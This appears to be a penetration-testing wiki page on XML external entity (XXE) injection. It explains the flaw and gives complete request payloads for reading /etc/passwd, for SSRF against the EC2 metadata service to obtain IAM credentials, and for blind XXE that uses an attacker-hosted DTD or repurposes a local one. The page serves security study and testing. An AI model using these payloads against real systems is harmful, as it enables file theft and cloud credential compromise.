---
authors: ShutdownRepo
category: web
---

# XXE injection

## Theory

Some web applications handle data and rely on the XML format to exchange data with the browsers.

> XXE vulnerabilities arise because the XML specification contains various potentially dangerous features, and standard parsers support these features even if they are not normally used by the application.
>
> XML external entity injection (also known as XXE) is a web security vulnerability that allows an attacker to interfere with an application's processing of XML data ([portswigger](https://portswigger.net/web-security/xxe)).

XXE injections can sometimes lead to [SSRF (Server-Side Request Forgery)](../ssrf/index), Local File Disclosure, Sensitive Information Disclosure, Data Exfiltration, RCE (Remote Code Execution) and so on.

## Practice

### Identify an XXE injection vulnerability

Testers need to find inputs or forms that send XML formatted data to the application.

For instance, in the following request, the user submitted a search form with the input "TESTINPUT".

```http
POST /action HTTP/1.1
Host: some.website
[...]
Connection: close

<?xml version="1.0"?>
<searchForm>  
         <from>TESTINPUT</from>
</searchForm>
```

The tester can detect if the XML parser parses the external entities by defining one inside a `DOCTYPE` element, and checking if the value in the `from` element gets replaced (the value will be replaced in the reflected messages sent by the application like error messages, search results).

```xml
<?xml version="1.0"?>
<!DOCTYPE xxeinjection [ <!ENTITY newfrom "VULNERABLE"> ]>
<searchForm>  
         <from>&newfrom;</from>
</searchForm>
```

A vulnerable application should replace the value by "VULNERABLE". 

### Retrieve content of local files

When the tester has identified a vulnerable entry point (see [identify an XXE](#identify-an-xxe-injection-vulnerability)). He can try to disclose local files by replacing the `from` value with the content of a sensitive file (e.g. `/etc/passwd`).

```xml
<?xml version="1.0"?>
<!DOCTYPE xxeinjection [ <!ENTITY newfrom SYSTEM "file:///etc/passwd"> ]>
<searchForm>
  <from>&newfrom;</from>
</searchForm>
```

### Conduct an SSRF attack

An XXE can be exploited to conduct an SSRF. When an application performs data transfer using XML, the request can be intercepted and forwarded to an internal host as follow.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY newfrom SYSTEM "http://{internal_host}/..."> ]>
<searchForm>
    <from>&newfrom;</from>
</searchForm>
```

::: details Example: Get EC2 IAM role temporary credentials
In the following example, the attacker tries to access the AWS EC2 metadata service to retrieve the EC2 role credentials used by the server.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/metadata/iam/security-credentials/"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```

The internal server will reveal the URL path to access the role's credentials as an error message at each step by displaying the HTTP response body of the accessed URL as follows: 

1. URL = "http://169.254.169.254/latest/metadata/iam/security-credentials/"\
 The server will return an error message revealing the EC2 role name: `invalid productId ec2-role-name`_._



1. URL = "http://169.254.169.254/latest/metadata/iam/security-credentials/ec2-role-name"\
 The server will return an error message revealing the EC2 role's secrets as `invalid productId`.

For more details, refer to the ["XXE to SSRF" PortSwigger lab](https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-perform-ssrf).
:::


### Blind XXE

Sometimes, an XXE injection can be found, but the app doesn't return the values of any defined external entities within its responses. It's called a blind XXE.

There are two ways to find & exploit a blind XXE : 

* XML parsing errors can be triggered so that sensitive data is included in the error messages.
* Out-of-band network interactions can be initiated, sometimes leaking sensitive data into the interaction data such as[ SSRF attacks](#conduct-an-ssrf-attack).

#### Blind XXE via error messages

It is possible to perform a blind XXE by triggering an XML parsing error where the error message contains the sensitive data that needs to be retrieved.

An attacker can trigger an XML parsing error message containing the contents of the `/etc/passwd` file using a malicious external DTD as follows :

```xml
 <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "ATTACKER-DTD-URL"> %xxe;]>
```

Then, on a victim server, the attacker can submit this payload to get access to the `/etc/passwd` file:

![](<./assets/ERROR-BASED-BLIND-XXE.png>)

Diagram explaining a blind XXE{.caption}


::: details Example
In this example, an attacker has access to a website containing a shop.

This shop has a "Check stock" feature that parses XML input but does not display the result.

```http
POST /product/stock HTTP/2
Host: something.web-security-academy.net.com
Cookie: session=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Content-Length: 107


<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
    <productId>
        1
    </productId>
    <storeId>
        1
    </storeId>
</stockCheck>
```

If an attacker intercept this request, he will be able to perform a blind error based XXE. First, on the attacker server, prepare the XML payload that will lead to leak `/etc/passwd` due to an XML parsing error :

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
%eval;
%exfil;
```

Then, the attacker will have to perform a out-of-band XXE to call the the payload stored on his exploit server :

```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "URL_OF_THE_ATTACKER_PAYLOAD"> %xxe;]>
```

In the HTTP response, the attacker will have access to the `/etc/passwd` file of the victim's server that host the shop. Final payload will look like this :

```http
POST /product/stock HTTP/2
Host: something.web-security-academy.net.com
Cookie: session=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Content-Length: 107


<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://attacker_server/xxe_payload"> 
%xxe;
]>
<stockCheck>
    <productId>
        1
    </productId>
    <storeId>
        1
    </storeId>
</stockCheck>
```
:::


#### Blind XXE by repurposing a local DTD

This type of attack is used when blind out-of-band XXE cannot be performed.

An attacker can trigger error messages using a [loophole in the XML language specification.](#user-content-fn-1)[^1]

The attack consists in invoking an existing DTD file (on the local filesystem). Then, redefining the existing entity in a way that triggers a parsing error containing sensitive data like [Blind XXE via error ](#blind-xxe-via-error-messages)messages.

![](<./assets/DTD-REPURPOSING-BLIND-XXE.png>)

Diagram explaining a blind XXE via repurposing a local DTD{.caption}


::: details Example
In this example, an attacker has access to a website containing a shop.

This shop has a "Check stock" feature that parses XML input but does not display the result.

```http
POST /product/stock HTTP/2
Host: something.web-security-academy.net.com
Cookie: session=bbbbbbbbbbbbbbbbbbbbbbbbbb
Content-Length: 107


<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
    <productId>
        1
    </productId>
    <storeId>
        1
    </storeId>
</stockCheck>
```

An attacker can edit the request to repurpose a local DTD. The main challenge is to find an existing DTD. 

For example, systems using the GNOME desktop environment often have a DTD at `/usr/share/yelp/dtd/docbookx.dtd` containing an entity called `ISOamso.`

Knowing this, the attacker can write this payload that will lead to leak the `/etc/passwd` file: 

```xml
<!DOCTYPE message [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```

Final payload will look like this :

```http
POST /product/stock HTTP/2
Host: something.web-security-academy.net.com
Cookie: session=bbbbbbbbbbbbbbbbbbbbbbbbbb
Content-Length: 107


<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE message [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
<stockCheck>
    <productId>
        1
    </productId>
    <storeId>
        1
    </storeId>
</stockCheck>
```
:::


## Resources

[https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe)

[https://enciphers.com/how-to-exploit-xxe-vulnerabilities/](https://enciphers.com/how-to-exploit-xxe-vulnerabilities/)

[https://portswigger.net/web-security/xxe/blind](https://portswigger.net/web-security/xxe/blind)

[https://blog.zsec.uk/blind-xxe-learning/](https://blog.zsec.uk/blind-xxe-learning/)

[https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection)